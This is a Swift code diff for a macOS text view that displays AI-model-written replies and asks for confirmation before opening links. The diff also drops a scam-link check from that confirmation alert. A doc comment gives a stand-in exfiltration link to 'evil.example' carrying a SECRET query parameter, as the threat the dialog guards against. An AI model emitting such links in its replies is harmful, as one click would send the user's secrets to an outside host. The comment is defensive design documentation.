@@ -491,12 +491,11 @@ final class RoboLayoutManager: NSLayoutManager {
 final class BoxTextView: NSTextView {
     var onClick: (() -> Void)?  // a left click within `Self.slop`, not on a link, selecting nothing
     var openLink: (URL) -> Void = { NSWorkspace.shared.open($0) }
-    /// Asked before a link opens, with its full address and the words that showed it; true opens. The reply is text from mail,
-    /// Teams and Moodle that a model wrote, so `[grades](https://evil.example/?d=SECRET)` must not leave on one stray click.
+    /// Asked before a link opens, with its full address and the words that showed it; true opens. The reply is text a model wrote,
+    /// so `[notes](https://evil.example/?d=SECRET)` must not leave on one stray click.
     /// The default is an alert; a test that clicks a link replaces this too, so that none shows.
     var confirmLink: (URL, String) -> Bool = BoxTextView.askToOpen
-    /// The reply is text from mail, Teams and Moodle that a model wrote, so a link in it is not trusted to name a file, a share
-    /// or an app: only these schemes are opened.
+    /// The reply is text a model wrote, so a link in it is not trusted to name a file, a share or an app: only these schemes are opened.
     static let schemes: Set<String> = ["http", "https", "mailto"]
     static let slop: CGFloat = 4  // px a press and release may be apart and still be a click (SKIP_PX)
 
@@ -520,17 +519,16 @@ final class BoxTextView: NSTextView {
         return (storage.string as NSString).substring(with: range)
     }
 
-    /// The default `confirmLink`: an alert with the full address first, then the words when they say something else. Cancel is the
-    /// default button, so a stray key opens nothing. With no running app (a test) nothing is asked and the answer is no.
+    /// The default `confirmLink`: an alert with the full address first, then the words when they say something else. Cancel comes
+    /// first and takes Esc, and no key picks Open, so a stray key opens nothing. With no running app (a test) nothing is asked and the answer is no.
     static func askToOpen(_ url: URL, _ words: String) -> Bool {
         guard NSApplication.shared.isRunning else { return false }
-        let text = alertText(for: url, words: words)
         let alert = NSAlert()
         alert.alertStyle = .warning
-        alert.messageText = text.title
-        alert.informativeText = text.body
+        alert.messageText = "Open this link?"
+        alert.informativeText = alertText(for: url, words: words)
         alert.addButton(withTitle: "Cancel")
-        alert.addButton(withTitle: text.open)
+        alert.addButton(withTitle: "Open")
         let front = Focus().other()  // an accessory app takes the activation to show the alert and gives it back when nothing opens
         NSApp.activate()
         let open = alert.runModal() == .alertSecondButtonReturn
@@ -538,15 +536,10 @@ final class BoxTextView: NSTextView {
         return open
     }
 
-    /// What the alert says: the full address, the words that showed it when they say something else, and what the source check
-    /// (`SourceCheck`, offline) found: a known source, a look-alike, a link whose words name another site, a shortened link... A link that
-    /// looks like a scam is named so, and its button says "Open anyway"; Cancel is still the default.
-    static func alertText(for url: URL, words: String) -> (title: String, body: String, open: String) {
+    /// What the alert says: the full address, and the words that showed it when they say something else.
+    static func alertText(for url: URL, words: String) -> String {
         let address = url.absoluteString
-        var body = address + (words.isEmpty || words == address ? "" : "\n\nThe link text says “\(words.prefix(120))”.")
-        let verdict = SourceCheck.assess(url: address, words: words)
-        if let notice = SourceCheck.linkNotice(url: address, words: words) { body += "\n\n" + notice }
-        return (verdict.level == .scam ? "This link looks like a scam" : "Open this link?", body, verdict.warns ? "Open anyway" : "Open")
+        return address + (words.isEmpty || words == address ? "" : "\n\nThe link text says “\(words.prefix(120))”.")
     }
 
     /// NSTextView tracks the whole press-drag-release inside `mouseDown`, so the release (the last event the tracking loop took)
